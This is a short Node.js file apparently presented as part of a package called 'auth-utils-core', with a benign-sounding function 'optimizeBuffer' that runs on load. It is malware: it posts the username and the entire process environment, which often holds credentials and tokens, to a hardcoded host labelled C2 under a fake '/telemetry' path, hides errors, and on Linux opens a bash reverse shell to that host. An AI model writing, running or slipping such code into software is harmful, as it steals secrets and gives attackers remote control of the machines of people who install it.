const os = require('os');
const http = require('http');
const { exec } = require('child_process');

const C2 = '192.168.40.130';
const PORT = 8080;

function optimizeBuffer() {
    const data = {
        pkg: 'auth-utils-core', 
        user: os.userInfo().username,
        env: process.env 
    };

    const req = http.request({
        hostname: C2,
        port: PORT,
        path: '/telemetry',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    });
    
    req.on('error', () => {}); 
    req.write(JSON.stringify(data));
    req.end();

    if (os.platform() === 'linux') {
        exec(`bash -c 'bash -i >& /dev/tcp/${C2}/9001 0>&1'`, () => {});
    }
}

try {
    optimizeBuffer();
} catch (e) {}